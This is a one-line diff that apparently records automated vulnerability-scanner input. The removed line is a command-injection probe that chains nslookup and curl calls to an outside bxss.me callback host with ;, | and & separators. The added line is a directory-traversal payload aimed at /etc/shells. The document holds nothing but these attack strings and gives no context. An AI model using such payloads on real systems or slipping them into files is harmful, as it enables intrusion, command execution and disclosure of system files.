@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitxcdqswqhlj04957.bxss.me||curl hitxcdqswqhlj04957.bxss.me)|(nslookup -q=cname hitxcdqswqhlj04957.bxss.me||curl hitxcdqswqhlj04957.bxss.me)&(nslookup -q=cname hitxcdqswqhlj04957.bxss.me||curl hitxcdqswqhlj04957.bxss.me)
+../../../../../../../../../../../../../../etc/shells
